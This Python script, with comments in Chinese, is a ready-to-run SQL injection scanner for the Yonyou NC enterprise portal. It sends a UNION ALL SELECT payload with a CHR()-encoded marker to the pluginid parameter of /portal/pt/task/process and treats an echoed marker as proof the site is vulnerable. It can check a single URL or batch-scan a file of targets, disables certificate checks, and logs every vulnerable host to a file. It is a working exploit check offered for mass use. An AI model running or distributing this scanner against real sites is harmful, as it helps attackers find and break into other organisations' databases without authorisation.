import sys
import requests
import argparse


# 漏洞检测模块
def checkVuln(url):
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    vulnurl = url + "/portal/pt/task/process?pageId=login&id=1&pluginid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(118)||CHR(98)||CHR(118)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--%20"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.get(vulnurl, headers=headers,timeout=5, verify=False)
        if "Plugin qvbvqqkbjq validate fail" in response.text:
            print(f"【+】当前网址存在漏洞：{url}")
            with open("vuln1.txt", "a+") as f:
                f.write(url + "\n")
        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")


# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            url = readline.strip()
            if 'http' in url:
                checkVuln(url)
            else:
                url=f"http://{url}"
                checkVuln(url)


def banner():
    print("用户NC SQL注入检测")
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")


# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='漏洞单批检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    parser.add_argument('-cmd','--cmd', type=str, help='执行命令')
    args = parser.parse_args()
    if args.url:

        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()


if __name__ == '__main__':
    main()